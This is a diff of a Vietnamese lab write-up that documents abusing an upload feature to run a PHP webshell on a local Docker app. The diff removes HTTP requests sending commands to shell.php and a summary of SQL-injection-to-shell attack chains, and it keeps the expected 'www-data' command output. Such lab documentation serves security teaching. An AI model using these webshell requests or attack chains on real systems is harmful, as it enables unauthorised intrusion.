@@ -197,11 +197,13 @@ $target = $this->dir . '/' . $name;
 move_uploaded_file((string) $file['tmp_name'], $target);
 ```
 
+Trong UploadService.php, dòng này lấy path đó ra:
 
-
-```text
-/var/www/html/public/uploads/shell.php
+```php
+'uploads' => dirname(__DIR__) . '/public/uploads'
 ```
+
+Nên `store()` ghi file vào `app/public/uploads/<filename>`.
 
 Sau khi upload, mở:
 
@@ -220,49 +222,6 @@ Kết quả mong đợi:
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
-![alt text](image-huong-4-07-rce-id.png)
-
-Thử thêm các lệnh an toàn:
-
-```http
-GET /uploads/shell.php?cmd=whoami HTTP/1.1
-Host: localhost:5000
-```
-
-```http
-GET /uploads/shell.php?cmd=pwd HTTP/1.1
-Host: localhost:5000
-```
-
-```http
-GET /uploads/shell.php?cmd=hostname HTTP/1.1
-Host: localhost:5000
-```
-
-![alt text](image-huong-4-08-rce-other-commands.png)
-
-Chuỗi này khác hướng 2 và hướng 3:
-
-```text
-Hướng 2: SQLi -> PostgreSQL Large Object -> native extension -> reverse shell
-Hướng 3: SQLi -> COPY FROM PROGRAM -> command execution trong DBMS
-Hướng 4: SQLi -> admin takeover -> abuse upload feature -> PHP webshell
-```
-
-Sau khi demo xong, cleanup:
-
-```powershell
-docker compose exec web rm -f /var/www/html/public/uploads/shell.php
-```
-
-Nếu có file local `shell.php` hoặc cookie test thì xóa thêm:
-
-```powershell
-Remove-Item -Force .\shell.php -ErrorAction SilentlyContinue
-Remove-Item -Force .\takeover.txt -ErrorAction SilentlyContinue
-```
-
-![alt text](image-huong-4-09-cleanup.png)
 
 ### Root cause
 
